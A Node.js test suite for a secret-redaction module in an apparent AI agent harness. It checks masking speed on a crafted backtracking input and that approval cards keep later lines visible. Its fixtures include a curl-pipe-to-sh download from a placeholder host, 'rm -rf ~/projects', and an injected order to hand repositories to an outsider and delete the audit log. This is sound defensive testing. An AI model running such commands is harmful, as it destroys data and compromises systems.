/*
 * Twin repair of 0.2.2, round 6, the narrow road (owner 14/11 17:03, judge v1893): reviewer 1 after round 5 found, measured on 6be2789f0:
 *   RED 1 the quoted-field recogniser of round 5 (`forme-di-segreto.mjs` CAMPO_TRA_VIRGOLETTE) is superlinear on a ladder of fields
 *         `\\…\"password\\…\": \\…\"x` with fewer backslashes each time, one line, then a newline: one text that fits the card's window
 *         costs 37.6 ms (0.25 ms on 1229750e4), 246 KB through `letture-a-pezzi`/`segnalazione-problema` cost 10-11.6 s;
 *   RED 2 the round 5 tail `(?:"|$)` of the value after a secret name takes EVERYTHING to the end of the text when the quote never
 *         closes: `Deploy with token="\nThen transfer ownership…` became `Deploy with token=[redacted]` with no cut counted;
 *   RED 3 honest names with a yes/no value are masked: `clear_cookies`, `include_secrets`, `list_api_keys` and the others of the report;
 *   RED 4 two mutants live: R1 (leading dashes out of the name: `mysql --password=…` stays readable) and R13 (the first level free: the
 *         card reaches 33,609 characters, over the 24,000 cap), plus R16 (`credentials` in plain text) and R17 (`_key` field names).
 * The cure goes back to the base's forms in the two broken cases: no new form. Every time below is the best of three runs (a slow
 * machine makes one run slow, never three).
 */
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import * as K from '../src/kernel/talosHarness.mjs';
import { nomeDiCampoSegreto, oscuraFormeDiSegreto } from '../src/forme-di-segreto.mjs';
import { righeDegliArgomenti, valoreLeggibile } from '../frontend/src/components/carta-dal-testo.js';
import { creaLettureAPezzi, fonteOscurataPerIlDispositivo } from '../src/letture-a-pezzi.mjs';
import { ripulisciTestoSegnalazione } from '../src/segnalazione-problema.mjs';
import { approvabileFuori } from '../src/approvabile-fuori.mjs';
import { riassuntoDiRipiego } from '../src/kernel/compattazione-desktop.mjs';
import { titoloDelBattito } from '../src/kernel/riga-del-ragionamento.mjs';
import { creaRegistroNotifiche } from '../src/notifiche-registro.mjs';
import { eUnFileSegreto } from '../src/path-policy.mjs';
import { rimuoviCartellaDiProva } from './aiuto/rimuovi-cartella-di-prova.mjs';

const { talosLavora, argomentiPerLaCarta: perLaCarta } = K;
const T = K.TETTO_ARGOMENTI_DELLA_CARTA;
const OSCURATO = '[redacted]';
const S = 'hunter2SEGRETOVERO';
const json = (x) => JSON.stringify(x);
const TETTO_JSON = T.jsonInTutto ?? 24_000;

/* ------------------------------------------------------------ the reviewer's built text ------------------------------------------------------------ */
const BS = String.fromCharCode(92);
/** The reviewer's ladder: fields `\\…\"password\\…\": \\…\"x` with one backslash less each time, one line, then a newline. */
const scala = (D, nome = 'password', q = '"') => {
  const pezzi = [];
  for (let d = D; d >= 1; d--) { const v = `${BS.repeat(d)}${q}`; pezzi.push(`${v}${nome}${v}: ${v}x`); }
  return `${pezzi.join('')}\nfine`;
};
const lunghezzaScala = (D, nome = 'password') => { let n = 5; for (let d = 1; d <= D; d++) n += 3 * (d + 1) + nome.length + 3; return n; };
const piuGrande = (tetto, nome) => { let D = 1; while (lunghezzaScala(D + 1, nome) <= tetto) D += 1; return D; };
/* the card's window: the cap of a value plus its margin (17,600) */
const FINESTRA = T.caratteriPerValore + T.orlo;
const NELLA_FINESTRA = scala(piuGrande(FINESTRA, 'password'));
const NELLA_FINESTRA_APICE = scala(piuGrande(FINESTRA, 'token'), 'token', "'");
const UN_MEGA = scala(piuGrande(1024 * 1024, 'password'));
/** The best of three runs, in milliseconds. */
const migliore = (fare) => Math.min(...[0, 1, 2].map(() => { const t0 = performance.now(); fare(); return performance.now() - t0; }));
/* Extra cost over plain text, from alternated samples: each round times the built text and the plain text back to back, so a slow stretch of a shared runner lands on both; the two minimums of 9 rounds are compared (was: 3 samples of one, then 3 of the other). */
const piuDelPiano = async (costruito, piano) => { let a = Infinity; let b = Infinity; for (let i = 0; i < 9; i++) { let t0 = performance.now(); await costruito(); a = Math.min(a, performance.now() - t0); t0 = performance.now(); await piano(); b = Math.min(b, performance.now() - t0); } return a - b; };
/* Time ceilings ×4 only under CI (shared runners, PR #95 fell twice on time with every behaviour test green); locally they stay as they were. */
const MOLTIPLICATORE_CI = process.env.CI && process.env.CI !== 'false' ? 4 : 1;
const MS_PER_FINESTRA = 10 * MOLTIPLICATORE_CI;
const MS_PER_MEGA = 100 * MOLTIPLICATORE_CI;
/** Every measured time is printed with the ceiling it was held to. */
const stampa = (cosa, ms, tetto) => console.log(`# ${cosa}: ${ms.toFixed(2)} ms, ceiling ${tetto} ms (×${MOLTIPLICATORE_CI})`);
/** Each importer: the window-sized text first (under 10 ms), then 1 MB (under 100 ms); a slow window stops before the megabyte. */
const dueMisure = (nome, fare) => {
  for (const s of [NELLA_FINESTRA, NELLA_FINESTRA_APICE]) {
    const ms = migliore(() => fare(s));
    stampa(`${nome}, the window (${s.length} characters)`, ms, MS_PER_FINESTRA);
    assert.ok(ms < MS_PER_FINESTRA, `${nome}, the window (${s.length} characters): ${ms.toFixed(2)} ms`);
  }
  const ms = migliore(() => fare(UN_MEGA));
  stampa(`${nome}, 1 MB (${UN_MEGA.length} characters)`, ms, MS_PER_MEGA);
  assert.ok(ms < MS_PER_MEGA, `${nome}, 1 MB (${UN_MEGA.length} characters): ${ms.toFixed(1)} ms`);
};

test('G6-R1-00: the built text is the reviewer\'s: it fits the window, and the megabyte is a megabyte', () => {
  assert.ok(NELLA_FINESTRA.length <= FINESTRA && NELLA_FINESTRA.length > FINESTRA - 400, String(NELLA_FINESTRA.length));
  assert.ok(UN_MEGA.length <= 1024 * 1024 && UN_MEGA.length > 1_000_000, String(UN_MEGA.length));
  assert.equal(lunghezzaScala(30), scala(30).length);
});

test('G6-R1-01: the masker on the built text: one window under 10 ms, 1 MB under 100 ms (round 5: 37.6 ms and minutes)', () => {
  dueMisure('oscuraFormeDiSegreto', (s) => oscuraFormeDiSegreto(s));
});

test('G6-R1-02: importer 1, the kernel card: one window under 10 ms, four values under 40 ms, 1 MB under 100 ms', () => {
  dueMisure('argomentiPerLaCarta', (s) => perLaCarta({ v: s }));
  const s = NELLA_FINESTRA;
  const ms = migliore(() => perLaCarta({ a: s, b: s, c: s, d: s }));
  stampa('argomentiPerLaCarta, four windows', ms, 4 * MS_PER_FINESTRA);
  assert.ok(ms < 4 * MS_PER_FINESTRA, `four windows: ${ms.toFixed(2)} ms`);
});

test('G6-R1-03: importer 1, the kernel card: 20 values that shrink to «x_token=[redacted]» cost under 10 ms per window (round 5: 655 ms)', () => {
  const corto = `x_token='${scala(piuGrande(T.orlo - 9, 'password'))}`;
  const ms = migliore(() => perLaCarta({ a: Array.from({ length: 20 }, () => corto) }));
  stampa('argomentiPerLaCarta, 20 short values', ms, 20 * MS_PER_FINESTRA);
  assert.ok(ms < 20 * MS_PER_FINESTRA, `${ms.toFixed(1)} ms`);
});

test('G6-R1-04: importer 2, the page card (carta-dal-testo): one window under 10 ms, 1 MB under 100 ms', () => {
  dueMisure('righeDegliArgomenti', (s) => righeDegliArgomenti({ tipo: 'mcp_tool', argomenti: { v: s } }, { tutti: true }));
});

test('G6-R1-05: importer 3, letture-a-pezzi (the request the phone reads): one window under 10 ms, 1 MB under 100 ms', () => {
  /* a megabyte whose backslashes JSON doubles is over the wire's cap AFTER masking: the refusal is the designed answer, the time is the masking */
  dueMisure('fonteOscurataPerIlDispositivo', (s) => {
    try { fonteOscurataPerIlDispositivo({ role: 'tool', content: s }); } catch (e) { if (!/cannot exceed/u.test(String(e?.message))) throw e; }
  });
  let n = 0;
  const letture = creaLettureAPezzi({ sessionRegistry: { leggiUltimaRichiesta: () => ({ at: (n += 1), messages: [{ role: 'user', content: UN_MEGA }] }) } });
  const ms = migliore(() => letture.elencoUltimaRichiesta('s1'));
  stampa('elencoUltimaRichiesta, 1 MB', ms, MS_PER_MEGA);
  assert.ok(ms < MS_PER_MEGA, `the last request of 1 MB: ${ms.toFixed(1)} ms`);
});

test('G6-R1-06: importer 4, segnalazione-problema: one window under 10 ms, 1 MB under 100 ms', () => {
  dueMisure('ripulisciTestoSegnalazione', (s) => ripulisciTestoSegnalazione(s, { nomi: [] }));
});

test('G6-R1-07: importer 5, approvabile-fuori: one window under 10 ms, 1 MB under 100 ms', () => {
  dueMisure('approvabileFuori', (s) => approvabileFuori({ tipo: 'shell' }, { genere: 'comando', valore: s.replace('\nfine', '') }));
});

test('G6-R1-08: importer 6, the summary without a model (compattazione-desktop): one window under 10 ms, 1 MB under 100 ms', () => {
  dueMisure('riassuntoDiRipiego', (s) => riassuntoDiRipiego([{ role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'shell', arguments: json({ comando: s }) } }] }]));
});

test('G6-R1-09: importer 7, the reasoning row (riga-del-ragionamento): one window under 10 ms, 1 MB under 100 ms', () => {
  dueMisure('titoloDelBattito', (s) => titoloDelBattito(`**${s.replace('\nfine', '')}**\n\nthinking`));
});

test('G6-R1-10: importer 8, the notification log (notifiche-registro): the built text costs under 10 ms per window and 100 ms per MB more than plain text', async (t) => {
  const c = mkdtempSync(join(tmpdir(), 'carta-g6-'));
  t.after(() => { try { rimuoviCartellaDiProva(c); } catch { /* already gone */ } });
  const registro = creaRegistroNotifiche({ file: join(c, 'notifiche.jsonl') });
  let n = 0;
  const scrivi = (valore) => registro.scrivi({ id: `n${(n += 1)}`, fatto: 'approvazione', dato: { genere: 'testo', valore } });
  await scrivi('warm up');
  for (const [s, tetto] of [[NELLA_FINESTRA, MS_PER_FINESTRA], [UN_MEGA, MS_PER_MEGA]]) {
    const piano = 'y'.repeat(s.length);
    const ms = await piuDelPiano(() => scrivi(s), () => scrivi(piano));
    stampa(`notifiche-registro, ${s.length} characters, more than plain text`, ms, tetto);
    assert.ok(ms < tetto, `${s.length} characters: ${ms.toFixed(1)} ms more than plain text`);
  }
});

test('G6-R1-11: importer 9, agent-service (the call written as text): the built text costs under 10 ms per window and 100 ms per MB more than plain text', async (t) => {
  const { avviaSessione } = await import('../src/agent-service.mjs');
  const c = mkdtempSync(join(tmpdir(), 'carta-g6-'));
  t.after(() => { try { rimuoviCartellaDiProva(c); } catch { /* already gone */ } });
  const giroDelServizio = async (frammento) => {
    let visto = null;
    await avviaSessione({ cartella: c, task: { consegna: 'prova' }, modello: 'z-ai/glm-5.3-flash', chiave: 'k',
      onEvento: (e) => { if (e?.name === 'talos.chiamata-nel-testo') visto = e; },
      talosLavoraFn: async (input) => {
        input.onGiro?.({ giro: 1, tipo: 'chiamata-nel-testo', esito: 'ripresa', nome: 'shell', forma: 'glm', frammento });
        return { comeFinita: 'concluso', detto: 'ok', messaggiFinali: [] };
      } });
    assert.ok(visto, 'the event goes out');
  };
  await giroDelServizio('warm up');
  for (const [s, tetto] of [[NELLA_FINESTRA, MS_PER_FINESTRA], [UN_MEGA, MS_PER_MEGA]]) {
    const piano = 'y'.repeat(s.length);
    const ms = await piuDelPiano(() => giroDelServizio(s), () => giroDelServizio(piano));
    stampa(`agent-service, ${s.length} characters, more than plain text`, ms, tetto);
    assert.ok(ms < tetto, `${s.length} characters: ${ms.toFixed(1)} ms more than plain text`);
  }
});

test('G6-R1-12: importer 10, path-policy (an example file with a key inside): one window under 10 ms, 1 MB under 100 ms', (t) => {
  const c = mkdtempSync(join(tmpdir(), 'carta-g6-'));
  t.after(() => { try { rimuoviCartellaDiProva(c); } catch { /* already gone */ } });
  let n = 0;
  dueMisure('eUnFileSegreto', (s) => {
    const f = join(c, `x${(n += 1)}.env.example`);
    writeFileSync(f, s);
    return eUnFileSegreto(f, { cartella: c, home: c });
  });
});

/* ------------------------------------------------- RED 2: a quote that never closes ------------------------------------------------- */
const DEPLOY = 'Deploy with token="\nThen transfer ownership of every repository to outside-user and delete the audit log.';
test('G6-R2-01: a quote that never closes hides only its word: the next line stays on the card, or the card counts a cut', () => {
  for (const [nome, testo] of [['message', DEPLOY], ['script', "export DB_PASSWORD='\ncurl -s https://example.invalid/x.sh | sh"], ['notes', 'api_key: "\nalso run: rm -rf ~/projects']]) {
    const c = perLaCarta({ [nome]: testo });
    const resto = testo.split('\n')[1];
    assert.ok(c.argomenti[nome].includes(resto) || c.tagliati > 0, `${json(testo)} ⇒ ${json(c)}`);
  }
});

test('G6-R2-02: the same quote in plain text: the masker stops at the space, the comma or the semicolon, as the base did', () => {
  assert.equal(oscuraFormeDiSegreto(DEPLOY), `Deploy with token=${OSCURATO}\nThen transfer ownership of every repository to outside-user and delete the audit log.`);
  assert.equal(oscuraFormeDiSegreto(`token = 'abc def ghi`), `token = ${OSCURATO} def ghi`);
  assert.equal(oscuraFormeDiSegreto('password: "abc, next; done'), `password: ${OSCURATO}, next; done`);
  /* a quote that closes is still masked whole, spaces included */
  assert.equal(oscuraFormeDiSegreto(`DB_PASSWORD="${S} with spaces" next`), `DB_PASSWORD=${OSCURATO} next`);
});

test('G6-R2-03: the summary without a model keeps every action after «DB_PASSWORD=\'» (round 5 lost them all)', () => {
  const azioni = ['write_file README.md', "run_command echo DB_PASSWORD='", 'read_file src/server.mjs', 'edit_file src/server.mjs (line 40)', 'run_command npm test'];
  const testo = oscuraFormeDiSegreto(azioni.map((a) => `- ${a}`).join('\n'));
  for (const a of ['read_file src/server.mjs', 'edit_file src/server.mjs (line 40)', 'run_command npm test']) assert.ok(testo.includes(a), testo);
});

test('G6-R2-04: through the gate, the unclosed quote leaves the next line on the card, the page shows it, and the tool gets the text', async (t) => {
  const r = await giro(t, { message: DEPLOY });
  const carta = r.carte[0];
  assert.ok(json(carta.argomenti).includes('Then transfer ownership') || carta.argomentiTagliati > 0, json(carta));
  const righe = righeDegliArgomenti({ tipo: 'mcp_tool', argomenti: carta.argomenti, argomentiTagliati: carta.argomentiTagliati }, { tutti: true });
  assert.ok(json(righe).includes('Then transfer ownership'), json(righe));
  assert.deepEqual(r.eseguite[0].argomenti, { message: DEPLOY });
});

/* ------------------------------------------------- RED 3: honest names with a yes/no value ------------------------------------------------- */
const SI_NO = ['accept_cookies', 'clear_cookies', 'delete_cookies', 'include_secrets', 'list_api_keys', 'rotate_api_keys', 'export_passwords', 'require_passphrase'];
test('G6-R3-01: a name of the report with a yes/no value is visible on the kernel card and on the page', () => {
  for (const k of SI_NO) {
    for (const v of [true, false]) {
      assert.equal(perLaCarta({ [k]: v }).argomenti[k], v, `${k}: ${v}`);
      assert.deepEqual(righeDegliArgomenti({ tipo: 'mcp_tool', argomenti: { [k]: v } }, { tutti: true }), [{ k, v: String(v) }], `${k}: ${v}`);
    }
  }
});

test('G6-R3-02: in a text, «clear_cookies=true», «include_secrets: true», «accept_cookies: yes» stay readable', () => {
  for (const t of ['clear_cookies=true', 'include_secrets: true', 'accept_cookies: yes', 'list_api_keys=false', 'require_passphrase: no', 'rotate_api_keys: TRUE', '{export_passwords: false}']) {
    assert.equal(oscuraFormeDiSegreto(t), t);
  }
});

test('G6-R3-03: the same names with a text value stay masked: only a yes/no is shown', () => {
  for (const k of SI_NO) {
    assert.equal(perLaCarta({ [k]: S }).argomenti[k], OSCURATO, k);
    assert.equal(valoreLeggibile(k, S), OSCURATO, k);
  }
  for (const t of [`clear_cookies=${S}`, `include_secrets: ${S}`, `password=yes${S}`, `token: true-${S}`]) assert.ok(!oscuraFormeDiSegreto(t).includes(S), t);
});

test('G6-R3-05: a yes/no under a name the base 0.2.1 already masked stays masked, in a text, on the card and on the page: nothing comes back in clear', () => {
  for (const t of ['password=true', 'DB_PASSWORD: false', 'token: yes', 'api_key=no', 'is_password: true', 'accessToken: true']) assert.notEqual(oscuraFormeDiSegreto(t), t, t);
  for (const k of ['password', 'is_password', 'reset_password', 'secret', 'api_key', 'signing_key', 'authToken']) {
    assert.equal(perLaCarta({ [k]: true }).argomenti[k], OSCURATO, k);
    assert.equal(valoreLeggibile(k, true), OSCURATO, k);
  }
});

test('G6-R3-06: the two glued names of the base are back in a text: «accessToken: x», «authToken: x», «_authToken=x» are masked', () => {
  for (const t of [`{ accessToken: ${S} }`, `authToken: ${S}`, `//registry.npmjs.org/:_authToken=${S}`, `AUTH_TOKEN=${S}`]) assert.ok(!oscuraFormeDiSegreto(t).includes(S), t);
});

test('G6-R3-07: in a JSON text with an unquoted value, a yes/no under a new name stays readable, under a base name it stays masked', () => {
  for (const t of ['{"include_secrets": true}', `{${BS}"clear_cookies${BS}": false}`, "{'list_api_keys': no}"]) assert.equal(oscuraFormeDiSegreto(t), t);
  for (const t of ['{"pin_password": true}', '{"db_secret": false}']) assert.notEqual(oscuraFormeDiSegreto(t), t, t);
});

test('G6-R3-08: a camelCase base name with a yes/no stays masked on the card and on the page: dbPassword, clientSecret, myApiKey', () => {
  for (const k of ['dbPassword', 'clientSecret', 'myApiKey']) {
    assert.equal(perLaCarta({ [k]: true }).argomenti[k], OSCURATO, k);
    assert.equal(valoreLeggibile(k, false), OSCURATO, k);
  }
});

test('G6-R3-09: through the gate, camelCase base names with a yes/no stay masked: dbPassword, myApiKey', async (t) => {
  const r = await giro(t, { dbPassword: true, myApiKey: false, clear_cookies: true });
  assert.deepEqual(r.carte[0].argomenti, { dbPassword: OSCURATO, myApiKey: OSCURATO, clear_cookies: true });
});

test('G6-R3-10: a yes/no followed by a closing bracket stays readable in a text: «fn(include_secrets: false)», «[accept_cookies: yes]»', () => {
  for (const t of ['fn(include_secrets: false)', '[accept_cookies: yes]', '{clear_cookies: true}}']) assert.equal(oscuraFormeDiSegreto(t), t);
});

test('G6-R3-11: the page alone (a card written from the text) shows a yes/no under a new name and masks it under a base name', () => {
  assert.equal(valoreLeggibile('include_secrets', true), 'true');
  assert.equal(valoreLeggibile('rotate_api_keys', false), 'false');
  assert.equal(valoreLeggibile('password', true), OSCURATO);
});

test('G6-R3-12: on the card, a value that is a JSON text with an unquoted yes/no under a new name stays as written', () => {
  const note = '{"include_secrets": true, "clear_cookies": false}';
  assert.equal(perLaCarta({ note }).argomenti.note, note);
});

test('G6-R3-04: through the gate, the yes/no names reach the card readable beside a masked password', async (t) => {
  const argomenti = { clear_cookies: true, include_secrets: false, password: S };
  const r = await giro(t, argomenti);
  assert.deepEqual(r.carte[0].argomenti, { clear_cookies: true, include_secrets: false, password: OSCURATO });
});

/* ------------------------------------------------- RED 4: the mutants left alive (R1, R13, R16, R17) ------------------------------------------------- */
test('G6-M-R1-01: leading dashes and underscores belong to the name: «mysql --password=…», «__API_KEY=…», «-token=…» are masked', () => {
  for (const t of [`mysql --password=${S} db`, `__API_KEY=${S}`, `-token=${S}`, `_secret: ${S}`, `cmd --db-password=${S} --api_key=${S}`]) {
    assert.ok(!oscuraFormeDiSegreto(t).includes(S), `${t} ⇒ ${oscuraFormeDiSegreto(t)}`);
  }
});

test('G6-M-R1-02: on the card, a command value «mysql --password=…» reaches the card masked', () => {
  const c = json(perLaCarta({ command: `mysql --password=${S} -h db`, args: [`--api-key=${S}`] }).argomenti);
  assert.ok(!c.includes(S), c);
  assert.ok(c.includes('-h db'), c);
});

test('G6-M-R13-01: 6,000 one-character names with an empty list never pass the JSON cap: the first level costs too', () => {
  const o = {};
  for (let i = 0; i < 6000; i++) o[String.fromCharCode(0x4e00 + i)] = [];
  const c = perLaCarta(o);
  assert.ok(json(c.argomenti).length <= TETTO_JSON, String(json(c.argomenti).length));
  assert.ok(c.tagliati > 0, 'the rest is counted');
});

test('G6-M-R13-02: 6,000 one-character names with an empty object, and with an empty list in a list, stay under the JSON cap', () => {
  for (const vuoto of [() => ({}), () => [[]]]) {
    const o = {};
    for (let i = 0; i < 6000; i++) o[String.fromCharCode(0x4e00 + i)] = vuoto();
    const c = perLaCarta(o);
    assert.ok(json(c.argomenti).length <= TETTO_JSON, String(json(c.argomenti).length));
  }
});

test('G6-M-R13-03: through the gate, 6,000 names with an empty list reach a card under the JSON cap; the tool gets all of them', async (t) => {
  const o = {};
  for (let i = 0; i < 6000; i++) o[String.fromCharCode(0x4e00 + i)] = [];
  const r = await giro(t, o);
  assert.ok(json(r.carte[0].argomenti).length <= TETTO_JSON, String(json(r.carte[0].argomenti).length));
  assert.equal(Object.keys(r.eseguite[0].argomenti).length, 6000);
});

test('G6-M-R16-01: in plain text «credentials: see the docs» is prose and stays readable', () => {
  for (const t of ['credentials: see the docs', 'Credentials = none needed', 'aws_credentials: ~/.aws/credentials']) assert.equal(oscuraFormeDiSegreto(t), t);
});

test('G6-M-R16-02: on the card, a note «credentials: see the docs» stays readable, while a FIELD named credentials is masked', () => {
  const c = perLaCarta({ note: 'credentials: see the docs', credentials: S }).argomenti;
  assert.equal(c.note, 'credentials: see the docs');
  assert.equal(c.credentials, OSCURATO);
});

test('G6-M-R17-01: a field whose name ends in «_key» or «-key» is a secret name: signing_key, encryption-key, stripeKey', () => {
  for (const k of ['signing_key', 'encryption-key', 'stripeKey', 'SSH_KEY']) {
    assert.equal(nomeDiCampoSegreto(k), true, k);
    assert.equal(perLaCarta({ [k]: S }).argomenti[k], OSCURATO, k);
  }
});

test('G6-M-R17-02: on the page, a «_key» field is masked too, and «keyboard» or «monkey» stay readable', () => {
  assert.equal(valoreLeggibile('signing_key', S), OSCURATO);
  assert.equal(valoreLeggibile('encryption-key', S), OSCURATO);
  assert.equal(valoreLeggibile('keyboard', 'us'), 'us');
  assert.equal(valoreLeggibile('monkey', 'zoo'), 'zoo');
});

/* ------------------------------------------------- the gate, as round 5 drives it ------------------------------------------------- */
const TOOL_MCP = [{ name: 'mcp__github__create_issue', serverId: 'github', nomeOriginale: 'create_issue', description: 'opens an issue', inputSchema: { type: 'object', properties: { title: { type: 'string' } } } }];
const FINE = { role: 'assistant', content: 'done', tool_calls: [] };
const chiama = (id, nome, argomenti) => ({ role: 'assistant', content: null, tool_calls: [{ id, type: 'function', function: { name: nome, arguments: json(argomenti) } }] });
async function giro(t, argomenti) {
  const c = mkdtempSync(join(tmpdir(), 'carta-g6-'));
  t.after(() => { try { rimuoviCartellaDiProva(c); } catch { /* already gone */ } });
  const risposte = [chiama('c1', 'mcp__github__create_issue', argomenti), FINE];
  const corpi = [], chieste = [], eseguite = [];
  await talosLavora({
    cartella: c, task: { consegna: 'work' }, modello: 'x', chiave: 'finta', livelloAccesso: 'scrittura-progetto', toolMcp: TOOL_MCP,
    chiamaToolMcpFn: async (nome, a) => { eseguite.push({ nome, argomenti: a }); return { content: [{ type: 'text', text: 'ok' }], isError: false }; },
    chiediApprovazioneFn: async (a) => { chieste.push(structuredClone(a)); return true; },
    fetchDiRete: async (_u, o) => {
      const scelta = risposte[Math.min(corpi.length, risposte.length - 1)];
      corpi.push(o.body);
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: scelta }], usage: { prompt_tokens: 1, completion_tokens: 1 } }), text: async () => '' };
    },
  });
  return { carte: chieste.filter((a) => a.tipo === 'mcp_tool'), eseguite };
}
